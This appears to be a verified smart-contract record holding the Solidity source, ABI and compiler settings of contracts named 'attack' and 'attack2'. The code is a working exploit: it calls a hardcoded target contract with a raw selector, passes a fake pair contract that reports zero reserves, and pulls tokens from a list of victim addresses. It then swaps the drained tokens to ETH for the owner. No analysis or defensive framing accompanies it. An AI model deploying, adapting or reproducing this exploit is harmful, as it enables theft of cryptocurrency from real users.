{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"src/attack.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.25;\\nimport \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\nimport \\\"./attack2.sol\\\";\\ninterface Route {\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint256 amountIn,\\n        uint256 amountOutMin,\\n        address[] memory path,\\n        address to,\\n        uint256 deadline\\n    ) external;\\n}\\ncontract attack {\\n    address private pairaddress;\\n    constructor () {\\n        attack2 pair = new attack2(address(this));\\n        pairaddress = address(pair);\\n    }\\naddress target = 0x634847D6b650B9f442b3B582971f859E6e65eB53;\\nRoute private route = Route(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\nfunction run(address token,address[] memory gjaddress) external{\\n    require(msg.sender == 0x46627Be3bD67d6a3e1d5c18B44FADe9341493F4c, \\\"not owner\\\");\\n    for (uint i = 0; i < gjaddress.length; i++) {\\n        run2(token,gjaddress[i],pairaddress);\\n    }\\n    (bytes memory data) = abi.encodeWithSignature(\\\"sendErc20(address)\\\", token);\\n    pairaddress.call(data);\\n   swaptoeth(token);\\n}\\n \\n function swaptoeth(address token) internal{\\n    address[] memory path= new address[](2);\\n    path[0] = address(token);\\n    path[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\\n    IERC20(token).approve(address(route),IERC20(token).balanceOf(address(this)));\\n    route.swapExactTokensForETHSupportingFeeOnTransferTokens(IERC20(token).balanceOf(address(this)),0,path,msg.sender,block.timestamp+1000);\\n }\\nfunction run2(address token,address gjaddress,address pair) internal {\\n        address[] memory path= new address[](1);\\n        path[0] = gjaddress;//\u653b\u51fb\u5730\u5740\\n        uint256[] memory amounts = new uint256[](1);\\n        amounts[0] = 100;\\n        // \u6784\u5efa\u8c03\u7528\u6570\u636e\\n        bytes memory data = abi.encodeWithSelector(\\n            bytes4(0x3f8a436c),\\n            token,//\u83b7\u53d6\u7684token\\n            0x6B175474E89094C44Da98b954EedeAC495271d0F,\\n            path,\\n            amounts,\\n            \\\" \\\",\\n            pair,\\n            0,\\n            1,\\n            0\\n        );\\n         (bool success, ) = target.call(data);\\n         require(success, \\\"Call failed\\\");\\n    }\\n    \\n\\nreceive() external payable {\\n    }\\n}\\n\"\r\n    },\r\n    \"lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the value of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the value of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\\n     * caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\\n     * allowance mechanism. `value` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\\n}\\n\"\r\n    },\r\n    \"src/attack2.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.25;\\nimport \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\ncontract attack2 {\\n    address target;\\n    constructor(address _target) {\\n        target = _target;\\n    }\\n    function getPair(address a,address b) public view returns (address) {\\n        return address(this);\\n}\\n    function  getReserves() public view returns (uint112,uint112,uint32) {\\n        return (0,0,0);\\n    }\\n     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external{\\n     }\\n     function sendErc20(address token) external{\\n         IERC20(token).transfer(target,IERC20(token).balanceOf(address(this)));\\n     }\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"remappings\": [\r\n      \"@openzeppelin/contracts/=lib/openzeppelin-contracts/contracts/\",\r\n      \"v3-periphery/=lib/v3-periphery/contracts/\",\r\n      \"v2-core/=lib/v2-core/contracts/\",\r\n      \"ds-test/=lib/forge-std/lib/ds-test/src/\",\r\n      \"erc4626-tests/=lib/openzeppelin-contracts/lib/erc4626-tests/\",\r\n      \"forge-std/=lib/forge-std/src/\",\r\n      \"openzeppelin-contracts/=lib/openzeppelin-contracts/\"\r\n    ],\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"metadata\": {\r\n      \"useLiteralContent\": false,\r\n      \"bytecodeHash\": \"ipfs\",\r\n      \"appendCBOR\": true\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"evmVersion\": \"paris\",\r\n    \"viaIR\": false,\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"gjaddress\",\"type\":\"address[]\"}],\"name\":\"run\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "attack", "CompilerVersion": "v0.8.25+commit.b61c2a91", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "paris", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}